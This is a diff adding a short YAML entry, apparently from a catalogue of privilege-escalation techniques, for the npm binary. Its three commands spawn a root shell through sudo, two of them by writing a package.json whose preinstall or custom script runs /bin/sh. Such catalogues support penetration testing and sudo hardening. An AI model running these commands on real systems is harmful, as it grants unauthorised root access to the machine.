@@ -1,0 +1,8 @@
+name: npm
+binary_path: /usr/bin/npm
+exploit_cmds:
+- sudo /usr/bin/npm exec /bin/sh
+- 'echo ''{"scripts": {"preinstall": "/bin/sh"}}'' >package.json && sudo /usr/bin/npm
+  -C . i'
+- 'echo ''{"scripts": {"xxx": "/bin/sh"}}'' >package.json && sudo /usr/bin/npm -C
+  . run xxx'
